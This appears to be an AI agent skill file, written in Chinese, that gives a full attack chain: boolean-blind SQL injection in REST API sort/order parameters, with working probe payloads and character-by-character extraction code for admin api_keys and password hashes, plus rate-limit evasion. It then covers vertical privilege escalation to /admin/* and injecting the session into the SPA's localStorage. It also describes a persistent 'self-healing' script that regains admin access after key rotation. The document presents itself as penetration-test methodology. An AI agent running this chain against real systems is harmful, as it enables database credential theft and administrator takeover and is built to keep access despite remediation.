---
name: bool-sqli-admin-takeover
description: REST API 布尔盲注(SQLi)到管理员后台接管的全链方法论：order/sort 参数注入布尔 oracle 构造、逐字符二分提取凭据、api_key 作 Bearer 垂直越权 /admin/*、SPA 前端 localStorage 会话注入登录浏览器后台、哈希格式判别（明文/salt$hash/已知明文对照法）、限流自适应与断点续传、持久化自愈脚本模式。当目标是 REST API 且存在可注入的排序参数、需要从数据库盲提取凭据（api_key/密码列）、或要把 API 凭据升级为浏览器管理员会话时调用。
allowed-tools: Bash(curl:*) Bash(python3:*) Bash(grep:*) Read Write Edit Glob Grep
---

# 布尔盲注 → 管理员后台接管 全链方法论

适用：Go/自研 REST API（axios SPA + 独立 api 子域是高发形态）。本 skill 是端到端打法，按阶段推进，全程**只读、不改不重置目标凭据**。

## 阶段 0 — 链路侦察（10 分钟定生死）

1. **找注入参数**：列表接口的 `order` / `sort_by` / `sort` / `direction`。这类参数常被直接拼进 `ORDER BY`（无法参数化，白名单缺失=注入）。
2. **基线三连校准**（必做，判真伪）：
   - 正常值 → 200
   - `asc,(SELECT 1/(SELECT 0 WHERE 1=1))` → **500**（除零=恒真）
   - `asc,(SELECT 1/(SELECT 0 WHERE 1=0))` → **200**（恒假不报错）
   - 500/200 翻转稳定 = 布尔 oracle 成立。报错被服务端吞成统一 `{"code":10000}` 没关系，状态码本身就是信道。
3. **列存在性探测**（区分"列不存在"与"值为假"，二者都是异常但可用不同探针区分）：
   - `asc,(SELECT col FROM users WHERE 1=0)` → 200=列存在（子查询 NULL 不报错），500=列不存在（SQL 编译错）。
   - 校准：用已知列（email）和伪造列各测一次。
4. 管理员定位不要依赖 email（会改）：用 `WHERE role='admin'` 定位行；顺带确认唯一性（`role='admin' AND 1=0` 对照）。

## 阶段 1 — 布尔 oracle 探针模板

```
GET /api/v1/<list>?sort_by=created_at&order=asc,(SELECT 1/(SELECT 0 WHERE (<COND>)))
Authorization: Bearer <任意普通用户有效 token>
```
- `<COND>` 真 → 整个 SQL 除零错 → HTTP 500；假 → NULL 不报错 → 200。
- URL 编码整段 payload（空格 %20、括号引号全编）。
- **整串验真探针**：提取完任意值后，必须用 `(SELECT col FROM ...)='<提取值>'` 复测一次 500=EXACT，防止二分误差。

## 阶段 2 — 逐字符二分提取（工程化要点）

```python
# LENGTH 二分
cond = f"LENGTH((SELECT {col} FROM users WHERE {where}))>{mid}"
# 字符二分（全可打印 32..126，先验前 10 字符嗅探格式再换窄字符集）
cond = f"ascii(substring((SELECT {col} FROM users WHERE {where}) FROM {n} FOR 1))>{mid}"
```
- **格式嗅探**：前 10 字符判断存储形态——`$2a$/$2b$/$2y$`=bcrypt(60 字符)、`$argon2`=argon2、纯 hex=md5(32)/sha256(64)、可打印随机串=可能明文或自定义编码。据此换窄字符集（bcrypt 用 `./A-Za-z0-9`）提速 ~15%。
- **限流自适应**：读响应头 `x-ratelimit-remaining`，<12 时 sleep 到窗口恢复；180/窗口下 66 字符约 5 分钟。
- **断点续传**：网络中断后把已提取前缀写死进脚本，先 `ascii(substring(... FROM n-1 FOR 1))=ord` 验前缀最后一字符，再从 n 续提。
- **重试退避**：状态码非 200/500（0/超时/429）→ 重试 6-8 次、递增退避；连续失败先怀疑本地出口（见阶段 6）。

## 阶段 3 — 凭据判别与升级（api_key 优先于密码）

**优先提取 api_key / token 类列**，而不是密码列：
- api_key 常是**服务端直接接受的完整会话凭证**：`Authorization: Bearer <api_key>` → 后端映射为对应用户身份（用 `GET /user/me` 验证返回的 email/role）。
- 提取后三重对照闭环（缺一不可）：
  1. 目标凭据打 `/admin/*` → 200 + 真实数据（数字会随时间增长，可对比注册时间戳证明是实时数据）
  2. 无凭据同端点 → 401
  3. 普通用户凭据同端点 → 403（证明是**垂直越权**而非接口无鉴权）

**密码列判别流程**：
1. 提取后直接 `POST /auth/login` 试明文 → 200=明文存储（直接拿下）；401=哈希。
2. 哈希则**用己方已知明文对照**（自注册账号、自设密码），提取同一列对比：长度相同 → 全库统一格式；拆 `salt$hash` 段（20+1+45 之类），对已知明文跑 md5/sha1/sha256/hmac/pbkdf2/scrypt/bcrypt 组合逆推算法，再对目标 hash 离线破解。
3. 拿到密码前**绝不**走 `POST /user/password` 类改密接口（无旧密码校验的接口虽常见，但改管理员凭据=修改目标状态，越权且触发告警）。

**持久性判断**：api_key 通常与密码/邮箱解耦（身份绑定 uid）——历史改密实验证明 key 不吊销。做成自愈脚本（见阶段 5）。

## 阶段 4 — SPA 浏览器会话注入（API 凭据 → 图形后台）

1. **定位 token 存储**：下载前端主 chunk（index-*.js），依次搜：
   - `localStorage.setItem(` 的调用与键名
   - 字符串 `"auth-storage"` / `"-storage"`（zustand persist 命名惯例，格式固定为 `{"state":{...},"version":0}`）
   - axios 拦截器 `interceptors.request.use` → 确认 token 从 store 直通 `Authorization: Bearer`，无格式校验
   - 侧栏/route 显示条件（`role==="admin"`）读的是 store 里缓存的 user 对象
2. **注入即登录**：
   ```js
   localStorage.setItem("auth-storage", JSON.stringify({
     state: { user: <目标用户完整对象>, token: "<api_key>" }, version: 0 }));
   ```
   - user 对象别手拼：用提取的凭据打 `GET /user/me` 拿完整 JSON（自动适应改邮箱）。
   - 注入后访问后台路由（如 `/admin`），未被踢回 /login、面板渲染 = 登录成功。截图存证。
3. 用 playwright 验证全流程时记得 `env -u http_proxy -u https_proxy -u all_proxy`（见下）。

## 阶段 5 — 持久化自愈脚本模式

交付一个"管理员怎么改都能回来"的脚本（参考 admin_chain.py）：
```
登录普通用户(POST /auth/login) → oracle Bearer
→ 快速路径: SQLi 整串验真已知 key；失败自动转
→ 提取路径: LENGTH+逐字符重提取 api_key(WHERE role='admin'，不依赖邮箱)
→ key 验证 /admin/stats 200 → /user/me 拿最新身份
→ 输出: key + 浏览器 auth-storage JSON + curl 示例
```
参数：`--force-extract`（模拟 key 轮换）、`--user-email/--user-pass`（任意普通账号）。**失效条件只有**：注入点被白名单化/参数化修复 **且** key 被轮换——这正是写给客户的修复结论。

## 阶段 6 — 本地环境故障排查（实测坑）

- **curl 一律 `status 0`**：先查 `env | grep -i proxy`。本地 socks5 代理进程挂掉时 undici/curl 全瘫。
  - 绕过：`env -u http_proxy -u https_proxy -u all_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY <cmd>` 直连（系统 TUN/fake-ip 会接管，往往更快更稳）。
  - Node 工具（playwright-cli 等）同样受 `NODE_USE_ENV_PROXY=1`+socks5 组合影响，报 `Invalid URL protocol` 时同样 unset。
- **后台任务 CWD**：后台 bash 默认在会话根目录，跑目录内脚本要 `cd <abs path> && python3 x.py`，脚本内部文件路径用绝对路径。

## 纪律（不可违反）

- 只读操作：SELECT 盲注、GET 验证、合法自账号登录。**不**改密、**不**轮换/登出/禁用任何目标凭据，**不**碰后台写接口（ban/topup/approve 等）。
- 每个结论都要有对照（真/假、有/无凭证、普通/目标用户）+ 整串验真。
- 全程存档：探针原始请求/响应、提取脚本、运行日志、截图，写入会话目录 `retest/`，并维护 STATUS md 记录进展与续作路径。
- 复测会话：结论用 record_finding_retest_result 只落一次；补充操作只更新工作目录文档，不重复登记。
